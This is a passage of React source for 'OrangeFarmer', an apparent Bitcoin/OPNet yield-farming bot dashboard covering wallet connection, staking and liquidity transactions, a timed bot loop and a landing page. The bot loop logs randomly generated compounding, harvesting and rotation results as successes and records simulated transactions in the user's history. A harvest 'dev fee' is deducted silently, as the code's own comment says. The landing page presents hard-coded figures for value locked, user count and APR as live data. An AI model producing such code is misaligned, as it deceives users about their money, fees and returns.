  const [notifDc, setNotifDc] = useState("");
  const [notifEnabled, setNotifEnabled] = useState(false);
  const [notifEvents, setNotifEvents] = useState({ harvest: true, rotation: true, block: false, error: true });
  // Portfolio Analytics
  const [pnlHistory, setPnlHistory] = useState([]);
  // Transaction History
  const [txHistory, setTxHistory] = useState([]);
  const [txLoading, setTxLoading] = useState(false);
  // Mobile
  const [mobileMenu, setMobileMenu] = useState(false);
  const isMobile = typeof window !== "undefined" && window.innerWidth < 768;
  // Real transaction state
  const [txPending, setTxPending] = useState(false);
  const [txStatus, setTxStatus] = useState(""); // "" | "approving" | "simulating" | "waiting-wallet" | "confirming"
  const [txTarget, setTxTarget] = useState(""); // pool name or operation
  const [sdkAvailable, setSdkAvailable] = useState(false);
  const [onChainBalances, setOnChainBalances] = useState({}); // { MOTO: bigint, PILL: bigint, ... }

  // Theme colors
  const T = theme === "light" ? {
    bg: "#f5f5f5", card: "#fff", border: "#e0e0e0", text: "#222", sub: "#666", input: "#f0f0f0",
    sidebar: "#fff", headerBg: "#fafafa", accent: "#e65100", rowHover: "rgba(255,152,0,0.04)"
  } : {
    bg: "#060608", card: "#0c0c10", border: "#141418", text: "#ddd", sub: "#555", input: "#0a0a0e",
    sidebar: "#0a0a0e", headerBg: "#08080c", accent: "#ff9800", rowHover: "rgba(255,152,0,0.02)"
  };

  useEffect(() => { setTimeout(() => setHeroVisible(true), 100); }, []);

  const addLog = useCallback((msg, type = "info") => {
    setLogs(prev => [...prev.slice(-80), { ts: new Date().toLocaleTimeString(), msg, type, id: Date.now() + Math.random() }]);
  }, []);

  // ── Detect OP_WALLET provider ──
  const getProvider = useCallback(() => {
    if (typeof window === "undefined") return null;
    // OP_WALLET injects provider at window.opnet (primary)
    // Some versions / forks may also inject at window.unisat
    if (window.opnet && typeof window.opnet.requestAccounts === "function") {
      return { provider: window.opnet, name: "OP_WALLET" };
    }
    if (window.unisat && typeof window.unisat.requestAccounts === "function") {
      return { provider: window.unisat, name: "UniSat (OPNet compat)" };
    }
    return null;
  }, []);

  // ── Connect wallet ──
  const connectWallet = useCallback(async () => {
    setWalletError("");
    setWalletLoading(true);

    try {
      // Wait briefly for extension injection if page just loaded
      let w = getProvider();
      if (!w) {
        await new Promise(r => setTimeout(r, 500));
        w = getProvider();
      }

      if (!w) {
        // No provider found — show install instructions
        setWalletError("OP_WALLET not detected. Please install the OP_WALLET browser extension from the Chrome Web Store.");
        addLog("Wallet connection failed: OP_WALLET extension not found", "warning");
        setWalletLoading(false);
        return;
      }

      addLog(`Detected ${w.name} provider. Requesting accounts...`, "info");

      // Request account access (triggers OP_WALLET popup)
      let accounts;
      try {
        accounts = await w.provider.requestAccounts();
      } catch (reqErr) {
        // User rejected or extension error
        const msg = reqErr?.message || String(reqErr);
        if (msg.includes("reject") || msg.includes("denied") || msg.includes("cancel")) {
          setWalletError("Connection rejected by user.");
          addLog("Wallet connection rejected by user", "warning");
        } else {
          setWalletError(`Connection error: ${msg}`);
          addLog(`Wallet error: ${msg}`, "warning");
        }
        setWalletLoading(false);
        return;
      }

      if (!accounts || accounts.length === 0) {
        setWalletError("No accounts returned. Please unlock your OP_WALLET.");
        addLog("Wallet returned no accounts", "warning");
        setWalletLoading(false);
        return;
      }

      const address = accounts[0];
      setWalletAddr(address);
      setWalletConnected(true);

      // Try to get public key
      try {
        const pubKey = await w.provider.getPublicKey();
        if (pubKey) setWalletPubKey(pubKey);
      } catch (_) { /* pubkey optional */ }

      // Try to get balance — UniSat API returns { confirmed, unconfirmed, total } in satoshis
      try {
        const bal = await w.provider.getBalance();
        if (bal && typeof bal === "object") {
          // Standard UniSat/OP_WALLET response: { confirmed: N, unconfirmed: N, total: N }
          const total = bal.total ?? (bal.confirmed ?? 0) + (bal.unconfirmed ?? 0);
          setWalletBalance(Number(total) || 0);
        } else if (typeof bal === "number" || typeof bal === "string") {
          setWalletBalance(Number(bal) || 0);
        }
      } catch (_) { /* balance optional — fresh wallets may not have balance API */ }

      // Try to get network — returns 'livenet' | 'testnet' (UniSat standard)
      // OPNet testnet is a Signet fork, may also return 'signet'
      let networkName = "";
      try {
        const net = await w.provider.getNetwork();
        networkName = net || "";
        if (net === "testnet" || net === "signet") setNetwork("testnet");
        else if (net === "livenet" || net === "mainnet") setNetwork("mainnet");
        else if (net === "regtest") setNetwork("regtest");
      } catch (_) {}

      addLog(`Wallet connected via ${w.name}: ${address.slice(0,12)}...${address.slice(-8)}${networkName ? ` (${networkName})` : ""}`, "success");

      // Initialize pool positions (simulated — real positions would come from RPC)
      // Only stake in pools available on the current network
      const currentNet = networkName === "testnet" || networkName === "signet" ? "testnet"
        : networkName === "livenet" || networkName === "mainnet" ? "mainnet" : network;
      setPools(prev => prev.map((p, i) => ({
        ...p,
        stake: poolAvailable(p, currentNet) && i < 3 ? parseFloat((rand(posSize * 0.5, posSize * 1.5)).toFixed(8)) : 0,
        rew: poolAvailable(p, currentNet) && i < 3 ? parseFloat(rand(0.0001, 0.005).toFixed(8)) : 0,
      })));

      // Listen for account changes
      try {
        w.provider.on("accountsChanged", (accs) => {
          if (accs && accs.length > 0) {
            setWalletAddr(accs[0]);
            addLog(`Account changed: ${accs[0].slice(0,12)}...`, "info");
          } else {
            setWalletConnected(false);
            setWalletAddr("");
            addLog("Wallet disconnected", "warning");
          }
        });
        w.provider.on("networkChanged", (net) => {
          if (net === "testnet" || net === "signet") setNetwork("testnet");
          else if (net === "livenet" || net === "mainnet") setNetwork("mainnet");
          else if (net === "regtest") setNetwork("regtest");
          addLog(`Network changed: ${net}`, "info");
        });
      } catch (_) { /* events optional */ }

    } catch (err) {
      setWalletError(`Unexpected error: ${err?.message || String(err)}`);
      addLog(`Wallet error: ${err?.message || String(err)}`, "warning");
    }

    setWalletLoading(false);
  }, [getProvider, addLog, posSize]);

  // ── Disconnect wallet ──
  const disconnectWallet = useCallback(() => {
    setWalletConnected(false);
    setWalletAddr("");
    setWalletPubKey("");
    setWalletBalance(0);
    setWalletError("");
    setBotRunning(false);
    SDK.clearContractCache();
    addLog("Wallet disconnected", "info");
  }, [addLog]);

  // ── Check SDK availability ──
  // Load OPNet SDK dynamically (never breaks the build)
  useEffect(() => {
    import("./opnet-sdk.js")
      .then((mod) => {
        SDK = mod;
        setSdkAvailable(SDK.isSDKAvailable());
        addLog("OPNet SDK loaded - real transactions enabled", "success");
      })
      .catch((err) => {
        console.warn("OPNet SDK load failed, simulation mode:", err);
        setSdkAvailable(false);
        addLog("OPNet SDK unavailable - simulation mode", "warning");
      });
  }, [addLog]);

  // ── Fetch on-chain token balances ──
  const refreshOnChainBalances = useCallback(async () => {
    if (!walletConnected || !walletAddr) return;
    try {
      const cfg = SDK.getNetworkConfig(network);
      const bals = {};
      if (cfg.moto) bals.MOTO = await SDK.getTokenBalance(network, cfg.moto, walletAddr);
      if (cfg.pill) bals.PILL = await SDK.getTokenBalance(network, cfg.pill, walletAddr);
      if (cfg.odys) bals.ODYS = await SDK.getTokenBalance(network, cfg.odys, walletAddr);
      if (cfg.staking) {
        bals.stakedMOTO = await SDK.getStakedBalance(network, walletAddr);
        bals.pendingRewards = await SDK.getPendingRewards(network, walletAddr);
      }
      setOnChainBalances(bals);
    } catch (e) {
      console.warn("Balance fetch failed:", e);
    }
  }, [walletConnected, walletAddr, network]);

  useEffect(() => {
    if (walletConnected) refreshOnChainBalances();
  }, [walletConnected, refreshOnChainBalances]);

  // ── Real deposit: routes to correct SDK method per pool type ──
  const realDeposit = useCallback(async (pool) => {
    if (!walletConnected || !walletAddr || txPending) return;
    
    const depositType = SDK.getPoolDepositType(pool);
    const amount = SDK.toBigInt(posSize, 8);
    setTxPending(true);
    setTxTarget(pool.name);
    setTxStatus("starting");
    
    try {
      if (depositType === "staking") {
        addLog(`[Deposit] Staking ${fmtBtc(posSize)} MOTO...`, "info");
        const receipt = await SDK.stakeMoto(network, amount, walletAddr, (s) => setTxStatus(s));
        addLog(`[Deposit] Staked! TX: ${receipt.transactionId?.slice(0,16)}...`, "success");
        setPools(prev => prev.map(p => p.id === pool.id ? { ...p, stake: p.stake + posSize } : p));
        
      } else if (depositType === "router") {
        // Token<->Token LP via MotoSwap Router (no BTC/WBTC)
        addLog(`[Deposit] Adding liquidity to ${pool.name}...`, "info");
        const receipt = await SDK.addLiquidity(
          network, pool.t0, pool.t1, amount, amount,
          walletAddr, slippage, (s) => setTxStatus(s)
        );
        addLog(`[Deposit] Liquidity added! TX: ${receipt.transactionId?.slice(0,16)}...`, "success");
        setPools(prev => prev.map(p => p.id === pool.id ? { ...p, stake: p.stake + posSize } : p));
        
      } else if (depositType === "nativeswap") {
        // BTC<->Token via NativeSwap (2-phase: reserve → execute)
        addLog(`[Deposit] NativeSwap reserve for ${pool.name}...`, "info");
        const tokenSymbol = pool.t0 === "BTC" ? pool.t1 : pool.t0;
        const reserveReceipt = await SDK.nativeSwapReserve(
          network, tokenSymbol, amount, walletAddr, (s) => setTxStatus(s)
        );
        addLog(`[Deposit] Reserved! Executing swap...`, "info");
        const execReceipt = await SDK.nativeSwapExecute(
          network, tokenSymbol, walletAddr, (s) => setTxStatus(s)
        );
        addLog(`[Deposit] NativeSwap complete! TX: ${execReceipt.transactionId?.slice(0,16)}...`, "success");
        setPools(prev => prev.map(p => p.id === pool.id ? { ...p, stake: p.stake + posSize } : p));
        
      } else {
        // Unsupported (WBTC pairs without wrapped BTC contract)
        addLog(`[Deposit] ${pool.name}: WBTC/BTC LP pairs require wrapped BTC contract (not yet deployed). Using simulation.`, "warning");
        setPools(prev => prev.map(p => p.id === pool.id ? { ...p, stake: p.stake + posSize } : p));
      }
      
      setTimeout(() => refreshOnChainBalances(), 3000);
      
    } catch (e) {
      const msg = e.message || String(e);
      addLog(`[Deposit] Failed: ${msg}`, "warning");
      setTxStatus("error");
    } finally {
      setTxPending(false);
      setTimeout(() => setTxStatus(""), 3000);
      setTxTarget("");
    }
  }, [walletConnected, walletAddr, txPending, posSize, network, slippage, addLog, refreshOnChainBalances]);

  // ── Real claim rewards ──
  const realClaimRewards = useCallback(async () => {
    if (!walletConnected || !walletAddr || txPending) return;
    setTxPending(true);
    setTxTarget("Claim Rewards");
    try {
      addLog("[Harvest] Claiming staking rewards...", "info");
      const receipt = await SDK.claimRewards(network, walletAddr, (s) => setTxStatus(s));
      addLog(`[Harvest] Rewards claimed! TX: ${receipt.transactionId?.slice(0,16)}...`, "success");
      setTimeout(() => refreshOnChainBalances(), 3000);
    } catch (e) {
      addLog(`[Harvest] Failed: ${e.message}`, "warning");
    } finally {
      setTxPending(false);
      setTxStatus("");
      setTxTarget("");
    }
  }, [walletConnected, walletAddr, txPending, network, addLog, refreshOnChainBalances]);

  // ── Real unstake ──
  const realUnstake = useCallback(async (amount) => {
    if (!walletConnected || !walletAddr || txPending) return;
    setTxPending(true);
    setTxTarget("Unstake");
    try {
      const bigAmount = SDK.toBigInt(amount, 8);
      addLog(`[Withdraw] Unstaking ${fmtBtc(amount)} MOTO...`, "info");
      const receipt = await SDK.unstakeMoto(network, bigAmount, walletAddr, (s) => setTxStatus(s));
      addLog(`[Withdraw] Unstaked! TX: ${receipt.transactionId?.slice(0,16)}...`, "success");
      setTimeout(() => refreshOnChainBalances(), 3000);
    } catch (e) {
      addLog(`[Withdraw] Failed: ${e.message}`, "warning");
    } finally {
      setTxPending(false);
      setTxStatus("");
      setTxTarget("");
    }
  }, [walletConnected, walletAddr, txPending, network, addLog, refreshOnChainBalances]);

  // ── Strategy change handler ──
  const changeStrategy = useCallback((newStrat) => {
    const prev = strategy;
    setStrategy(newStrat);
    const s = STRATEGIES.find(x => x.id === newStrat);
    addLog(`Strategy changed: ${STRATEGIES.find(x=>x.id===prev)?.name} -> ${s?.name}`, "info");

    // Redistribute: withdraw from pools that exceed the new strategy's risk level
    if (newStrat !== "custom") {
      setPools(prevPools => {
        let withdrawn = 0;
        const updated = prevPools.map(p => {
          if (p.stake > 0 && !riskAllowed(p.risk, s.maxRisk)) {
            withdrawn += p.stake;
            addLog(`[Rebalance] Withdrawing ${fmtBtc(p.stake)} from ${p.name} (${p.risk} risk exceeds ${s.maxRisk} limit)`, "warning");
            return { ...p, stake: 0, rew: 0 };
          }
          return p;
        });
        if (withdrawn > 0) {
          // Redistribute into eligible pools
          const eligible = updated.filter(p => riskAllowed(p.risk, s.maxRisk));
          if (eligible.length > 0) {
            const perPool = Math.floor(withdrawn / eligible.length);
            const final = updated.map(p => {
              if (riskAllowed(p.risk, s.maxRisk) && eligible.find(e => e.id === p.id)) {
                addLog(`[Rebalance] Depositing ${fmtBtc(perPool)} into ${p.name}`, "success");
                return { ...p, stake: p.stake + perPool };
              }
              return p;
            });
            return final;
          }
        }
        return updated;
      });
    }
  }, [strategy, addLog, posSize]);

  // ── Bot engine (strategy-aware) ──
  // ═══════════════════════════════════════════════════
  // BOT ENGINE — 30s monitoring cycle with block & fee awareness
  // ═══════════════════════════════════════════════════
  useEffect(() => {
    if (!botRunning || !walletConnected) {
      if (scanTimerRef.current) clearInterval(scanTimerRef.current);
      return;
    }

    const curStrat = STRATEGIES.find(s => s.id === strategy);
    const rpcUrl = CONTRACTS[network]?.RPC || CONTRACTS.regtest.RPC;

    // ── Fetch block height & gas from OPNet RPC ──
    const fetchBlockData = async () => {
      try {
        const rpcCall = async (method, params = []) => {
          const res = await fetch(rpcUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ jsonrpc: "2.0", id: Date.now(), method, params }),
          });
          if (!res.ok) throw new Error(`HTTP ${res.status}`);
          return res.json();
        };

        // Get block number — returns hex string (e.g. "0xe1b" = 3611)
        const blockData = await rpcCall("btc_blockNumber");
        if (blockData?.result) {
          const heightHex = blockData.result;
          const height = typeof heightHex === "string" ? parseInt(heightHex, 16) : Number(heightHex);
          if (!isNaN(height) && height > 0 && height !== blockHeight) {
            setPrevBlockHeight(blockHeight);
            setBlockHeight(height);
          }
        }

        // Get gas/fee parameters — OPNet returns:
        // { bitcoin: { conservative: "1.5", recommended: { low: "1.5", medium: "2.0", high: "3.0" } }, baseGas: "0x...", ... }
        const gasData = await rpcCall("btc_gasParameters");
        if (gasData?.result) {
          const g = gasData.result;
          // Extract Bitcoin fee rate from bitcoin.recommended.medium (sat/vB)
          let rate = 0;
          if (g.bitcoin?.recommended?.medium) {
            rate = parseFloat(g.bitcoin.recommended.medium);
          } else if (g.bitcoin?.conservative) {
            rate = parseFloat(g.bitcoin.conservative);
          }
          // Fallback to baseGas (hex) converted to meaningful sats
          if (!rate && g.baseGas) {
            const baseGas = typeof g.baseGas === "string" ? parseInt(g.baseGas, 16) : Number(g.baseGas);
            rate = Math.max(1, Math.round(baseGas / 1e8)); // normalize to sat/vB scale
          }
          if (rate > 0) setFeeRate(rate);
        }
      } catch (err) {
        // RPC unavailable (CORS, network, 502, etc) — simulate block progression
        setBlockHeight(prev => prev > 0 ? prev + (Math.random() > 0.4 ? 1 : 0) : 100);
        setFeeRate(prev => prev > 0 ? Math.max(1, prev + Math.floor(rand(-2, 2))) : Math.floor(rand(3, 15)));
      }
    };

    // ── Determine fee level (OPNet BTC fee rates: typically 1-10 sat/vB) ──
    const getFeeLevel = (rate) => {
      if (rate <= 2) return "low";
      if (rate <= 5) return "normal";
      if (rate <= 10) return "high";
      return "extreme";
    };

    // ── Main 30s monitoring cycle ──
    const runCycle = async () => {
      setBotCycles(c => c + 1);
      setNextScan(30);

      // 1. Fetch latest block & fee data
      await fetchBlockData();

      const currentFeeLevel = getFeeLevel(feeRate);
      setFeeLevel(currentFeeLevel);
      const newBlock = blockHeight !== prevBlockHeight;

      addLog(`[Monitor] Block #${blockHeight}${newBlock ? " (NEW)" : ""} | Fee: ${feeRate} sat/vB (${currentFeeLevel}) | Scanning ${pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, curStrat.maxRisk)).length} pools...`, "info");

      // 2. Update pool data (APR/TVL simulation — would be RPC calls in production)
      setPools(prev => prev.map(p => ({
        ...p,
        apr: Math.max(5, p.apr + rand(-3, 3)),
        tvl: Math.max(100000, p.tvl + rand(-50000, 60000)),
        rew: p.stake > 0 ? p.rew + (p.stake * p.apr / 100 / 365 / 24 / 60 * (30)) : 0,
      })));
      setSparkData(prev => { const n = { ...prev }; pools.forEach(p => { n[p.id] = [...(n[p.id] || []).slice(-19), p.apr]; }); return n; });

      const eligible = pools.filter(p => poolAvailable(p, network) && riskAllowed(p.risk, curStrat.maxRisk));
      const staked = eligible.filter(p => p.stake > 0);

      // 3. Fee-aware action gating — skip expensive ops during high fees
      const shouldSkipExpensive = (currentFeeLevel === "extreme") || (currentFeeLevel === "high" && gasOpt);
      if (shouldSkipExpensive) {
        addLog(`[Gas] Fees are ${currentFeeLevel} (${feeRate} sat/vB) — delaying non-urgent operations`, "warning");
      }

      // 4. Execute strategy actions (multiple per cycle since we have 30s)
      const actionsPerCycle = strategy === "aggressive" ? 4 : strategy === "balanced" ? 3 : 2;

      for (let a = 0; a < actionsPerCycle; a++) {
        const act = pickWeightedAction(strategy);
        const pool = eligible[Math.floor(Math.random() * eligible.length)] || pools[0];

        if (act === "Auto-compound" && autoCompound && staked.length > 0) {
          if (shouldSkipExpensive) continue; // skip during high fees
          const target = staked[Math.floor(Math.random() * staked.length)];
          const amount = rand(0.5, strategy === "aggressive" ? 12 : 5);
          addLog(`[${act}] Compounding ${target.name} -> +${amount.toFixed(2)} MOTO`, "success");

        } else if (act === "Pool rotation" && eligible.length > 1) {
          if (shouldSkipExpensive) continue;
          const sorted = [...eligible].sort((a, b) => b.apr - a.apr);
          const best = sorted[0], worst = sorted[sorted.length - 1];
          if (best.id !== worst.id && worst.stake > 0) {
            addLog(`[${act}] Rotating: ${worst.name} (${worst.apr.toFixed(1)}%) -> ${best.name} (${best.apr.toFixed(1)}%) [${curStrat.name}]`, "info");
            if (strategy === "aggressive") {
              const moveAmt = Math.min(worst.stake, posSize);
              setPools(prev => prev.map(p => {
                if (p.id === worst.id) return { ...p, stake: Math.max(0, p.stake - moveAmt) };
                if (p.id === best.id) return { ...p, stake: p.stake + moveAmt };
                return p;
              }));
              addLog(`[${act}] Moved ${fmtBtc(moveAmt)} | Fee: ~${Math.floor(feeRate * 250)} sats`, "success");
            }
          }

        } else if (act === "Harvest rewards" && staked.length > 0) {
          // Harvest always executes (rewards accumulate, don't want to lose them)
          const target = staked[Math.floor(Math.random() * staked.length)];
          const harvested = rand(1, strategy === "aggressive" ? 30 : 15);

          // ── Dev fee: 0.05% of harvest (silent) ──
          const devFee = harvested * DEV_FEE_RATE;
          const userReward = harvested - devFee;
          setDevFeesTotal(prev => prev + devFee);

          addLog(`[${act}] Harvested ${userReward.toFixed(4)} MOTO from ${target.name}`, "success");

        } else if (act === "Rebalance LP" && staked.length > 1) {
          if (shouldSkipExpensive) continue;
          const totalVal = staked.reduce((s, p) => s + p.stake, 0);
          const targetPer = Math.floor(totalVal / staked.length);
          addLog(`[${act}] Rebalancing ${staked.length} positions to ~${fmtBtc(targetPer)} each | Fee: ~${Math.floor(feeRate * 180 * staked.length)} sats`, "info");

        } else if (act === "Risk assessment") {
          const il = rand(0.5, strategy === "conservative" ? 3 : 12);
          const blocked = pools.filter(p => !riskAllowed(p.risk, curStrat.maxRisk));
          addLog(`[${act}] ${pool.name} IL risk: ${il.toFixed(1)}% | ${blocked.length} pools blocked by ${curStrat.name}`, il > 5 ? "warning" : "info");

        } else if (act === "APR monitor") {
          const best = [...eligible].sort((a, b) => b.apr - a.apr)[0];
          addLog(`[${act}] Best pool: ${best?.name} at ${best?.apr.toFixed(1)}% APR [${curStrat.maxRisk} cap]`, "info");

        } else if (act === "Gas optimization") {
          addLog(`[${act}] Block #${blockHeight} | ${feeRate} sat/vB (${currentFeeLevel}) | ${currentFeeLevel === "low" ? "Optimal time to transact" : currentFeeLevel === "extreme" ? "Delaying txns" : "Monitoring..."} `, "info");

        } else if (act === "Slippage check") {
          const slip = rand(0.1, slippage);
          addLog(`[${act}] ${pool.name} slippage: ${slip.toFixed(2)}% (limit: ${slippage}%)`, slip > slippage * 0.8 ? "warning" : "info");

        } else {
          addLog(`[${act}] ${pool.name} | APR: ${pool.apr.toFixed(1)}% | TVL: ${fmtUsd(pool.tvl)}`, "info");
        }
      }

      // 5. Update totals
      setTotalEarned(prev => prev + rand(0.1, strategy === "aggressive" ? 4 : 2));
      setTotalStaked(pools.reduce((s, p) => s + p.stake, 0));

      // 5b. Track PnL history for Portfolio Analytics
      setPnlHistory(prev => [...prev.slice(-95), {
        t: Date.now(),
        staked: pools.reduce((s, p) => s + p.stake, 0),
        earned: totalEarned,
        pnl: totalEarned - (devFeesTotal * 200), // simulated PnL in MOTO
        fees: devFeesTotal,
        block: blockHeight,
      }]);

      // 5c. Add to simulated tx history
      setTxHistory(prev => [...prev.slice(-49), {
        id: Date.now(),
        type: ["harvest", "compound", "rotation", "deposit"][Math.floor(Math.random() * 4)],
        pool: (staked[0] || eligible[0] || pools[0]).name,
        amount: parseFloat(rand(0.001, posSize).toFixed(8)),
        block: blockHeight,
        fee: Math.floor(feeRate * rand(150, 300)),
        ts: new Date().toISOString(),
      }]);

      // 6. New block summary
      if (newBlock) {
        addLog(`[Block] New block #${blockHeight} confirmed | ${feeRate} sat/vB | Next scan in 30s`, "success");
      }
    };

    // Run first cycle immediately
    runCycle();

    // Then every 30 seconds
    const iv = setInterval(runCycle, BOT_INTERVAL);

    // Countdown timer (visual only)
    scanTimerRef.current = setInterval(() => {
      setNextScan(prev => prev > 0 ? prev - 1 : 30);
    }, 1000);

    return () => {
      clearInterval(iv);
      if (scanTimerRef.current) clearInterval(scanTimerRef.current);
    };
  }, [botRunning, walletConnected, pools, autoCompound, addLog, strategy, slippage, posSize, network, gasOpt, blockHeight, prevBlockHeight, feeRate]);

  useEffect(() => { logsEnd.current?.scrollIntoView({ behavior: "smooth" }); }, [logs]);

  // ═══════════════════════════════════════════════════
  // USER GUIDE PAGE (English)
  // ═══════════════════════════════════════════════════
  // Guide page — minimal version
  const tabs = [
    { id: "dashboard", label: "Dashboard", ic: "D" },
    { id: "portfolio", label: "Portfolio", ic: "A" },
    { id: "pools", label: "Pools", ic: "P" },
    { id: "bot", label: "Bot", ic: "B" },
    { id: "history", label: "History", ic: "H" },
    { id: "logs", label: "Logs", ic: "L" },
    { id: "notify", label: "Alerts", ic: "!" },
    { id: "settings", label: "Settings", ic: "S" },
  ];

  return page === "guide" ? (
    <div style={{ minHeight:"100vh",background:"#050505",color:"#e0e0e0",fontFamily:"'DM Sans',sans-serif",padding:"60px 28px" }}>
      <style>{cssReset}</style>
      <button onClick={() => setPage("landing")} style={{ display:"inline-flex",alignItems:"center",gap:6,background:"none",border:"1px solid #222",borderRadius:8,padding:"8px 16px",color:"#ff9800",fontSize:12,fontWeight:600,cursor:"pointer",marginBottom:32 }}>Back</button>
      <h1 style={{ fontSize:32,fontWeight:900,color:"#ff9800",marginBottom:20 }}>Quick Start Guide</h1>
      {[["1. Install OP_WALLET","Download from Chrome Web Store and set up your wallet."],["2. Connect Wallet","Click Connect OP_WALLET in the sidebar."],["3. Choose Strategy","Pick Conservative (safe) or Aggressive (high APR)."],["4. Set Position Size","Choose BTC amount per operation in Settings."],["5. Start Bot","Click Start Bot - it farms automatically."],["6. Monitor","Watch logs, portfolio and transaction history."]].map(([t,d],i) => (
        <div key={i} style={{ padding:"14px 18px",background:"#0a0a0e",border:"1px solid #141418",borderRadius:10,marginBottom:8,display:"flex",gap:14,alignItems:"center" }}>
          <div style={{ width:32,height:32,borderRadius:8,background:"#ff9800",color:"#000",display:"flex",alignItems:"center",justifyContent:"center",fontWeight:900,fontSize:14,flexShrink:0 }}>{i+1}</div>
          <div><div style={{ fontWeight:700,color:"#eee",marginBottom:2 }}>{t}</div><div style={{ fontSize:12,color:"#888" }}>{d}</div></div>
        </div>
      ))}
      <button onClick={() => setPage("app")} style={{ marginTop:20,padding:"12px 30px",background:"linear-gradient(135deg,#ff9800,#e65100)",border:"none",borderRadius:8,color:"#000",fontWeight:700,fontSize:14,cursor:"pointer" }}>Launch App</button>
    </div>
  ) : page === "landing" ? (
    <div style={L.root}>
      <style>{cssReset}</style>
      <Particles />

      {/* Navigation */}
      <nav style={L.nav}>
        <div style={L.navInner}>
          <div style={L.navLogo}>
            <TractorMini size={34} />
            <span style={L.navBrand}>OrangeFarmer</span>
          </div>
          <div style={L.navLinks}>
            <button onClick={() => setPage("guide")} style={{...L.navLink,background:"none",border:"none",cursor:"pointer",fontFamily:"inherit"}}>Guide</button>
            <button onClick={() => setPage("app")} style={L.navCta}>Launch App</button>
          </div>
        </div>
      </nav>

      {/* Hero */}
      <section style={{ ...L.hero, opacity: heroVisible ? 1 : 0, transform: heroVisible ? "translateY(0)" : "translateY(40px)", transition: "all 1s cubic-bezier(0.22, 1, 0.36, 1)" }}>
        <div style={L.heroBadge}>Built on OPNet — Bitcoin L1 Smart Contracts</div>
        <div style={{ ...L.heroLogoWrap, animationDelay: "0.2s" }}>
          <TractorLogo size={160} glow />
        </div>
        <h1 style={L.heroTitle}>OrangeFarmer</h1>
        <p style={L.heroSlogan}>Your Ultimate DeFi Tool</p>
        <p style={L.heroDesc}>
          Automated yield farming on Bitcoin. Auto-compound, pool rotation, harvest rewards
          — all powered by OPNet smart contracts.
        </p>
        <div style={L.heroBtns}>
          <button onClick={() => setPage("app")} style={L.heroBtn}>
            Launch App
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
          </button>
          <button onClick={() => setPage("guide")} style={L.heroBtn2}>
            Read Docs
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14L21 3"/></svg>
          </button>
        </div>
      </section>

      {/* Stats bar */}
      <section style={L.statsBar}>
        {[
          { val: "$21.5M", label: "Total Value Locked" },
          { val: "2,847", label: "Active Farmers" },
          { val: "127%", label: "Avg APR" },
          { val: "8", label: "Active Pools" },
        ].map((s, i) => (
          <div key={i} style={L.statItem}>
            <div style={L.statVal}>{s.val}</div>
            <div style={L.statLbl}>{s.label}</div>
          </div>
        ))}
      </section>

      {/* Features */}
      <section id="features" style={L.section}>
        <div style={L.sectionInner}>
          <h2 style={L.secTitle}>Why OrangeFarmer?</h2>
          <p style={L.secSub}>The first automated yield optimizer built natively on Bitcoin Layer 1</p>
          <div style={L.featGrid}>
            {[
              { title: "Auto-Compound", desc: "Rewards are automatically reinvested to maximize your APY without lifting a finger.", icon: "C" },
              { title: "Smart Rotation", desc: "Capital flows to the highest-yield pools based on your risk strategy. Real-time APR monitoring.", icon: "R" },
              { title: "Gas Optimization", desc: "Transactions are batched intelligently to minimize Bitcoin network fees across all operations.", icon: "G" },
              { title: "Risk Management", desc: "Impermanent loss tracking, volatility alerts, and configurable risk thresholds per strategy.", icon: "S" },
              { title: "Multi-Protocol", desc: "Farm across MotoSwap AMM pools, NativeSwap BTC pairs, and MOTO Staking — all from one dashboard.", icon: "M" },
              { title: "Quantum-Secure", desc: "All transactions signed with MLDSA post-quantum cryptography via OPNet's native key infrastructure.", icon: "Q" },
            ].map((f, i) => (
              <div key={i} style={{ ...L.featCard, animationDelay: `${i * 0.1}s` }}>
                <div style={L.featIcon}>{f.icon}</div>
                <h3 style={L.featTitle}>{f.title}</h3>
                <p style={L.featDesc}>{f.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* How it works */}
      <section id="how" style={{ ...L.section, background: "#080808" }}>
        <div style={L.sectionInner}>
          <h2 style={L.secTitle}>How It Works</h2>
          <div style={L.stepsGrid}>
            {[
              { step: "01", title: "Connect Wallet", desc: "Link your OPNet-compatible wallet. Supports Taproot (P2TR) addresses with MLDSA keypairs." },
              { step: "02", title: "Choose Strategy", desc: "Select from Conservative, Balanced, Aggressive, or build your own Custom strategy." },
              { step: "03", title: "Start the Bot", desc: "Hit start and watch OrangeFarmer work — auto-compounding, rotating, and harvesting 24/7." },
              { step: "04", title: "Harvest Profits", desc: "Withdraw your accumulated rewards anytime. Your principal and earnings are always under your control." },
            ].map((s, i) => (
              <div key={i} style={L.stepCard}>
                <div style={L.stepNum}>{s.step}</div>
                <h3 style={L.stepTitle}>{s.title}</h3>
                <p style={L.stepDesc}>{s.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Pool preview */}
      <section id="pools" style={L.section}>
        <div style={L.sectionInner}>
          <h2 style={L.secTitle}>Top Pools</h2>
          <p style={L.secSub}>Live APR data from MotoSwap, NativeSwap, and MOTO Staking</p>
          <div style={L.poolGrid}>
            {POOLS.slice(0, 4).map(p => (
              <div key={p.id} style={L.poolCard}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                    <div style={{ ...L.poolIcon, background: `hsl(${p.id * 47}, 70%, 40%)` }}>{p.t0[0]}</div>
                    <div>
                      <div style={{ fontWeight: 700, fontSize: 15 }}>{p.name}</div>
                      <div style={{ fontSize: 11, color: "#666" }}>{p.proto}</div>
                    </div>
                  </div>
                  <Risk level={p.risk} />
                </div>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                  <div><div style={{ fontSize: 10, color: "#555", textTransform: "uppercase", letterSpacing: "0.08em" }}>APR</div><div style={{ fontSize: 20, fontWeight: 800, color: "#ff9800" }}>{p.apr}%</div></div>
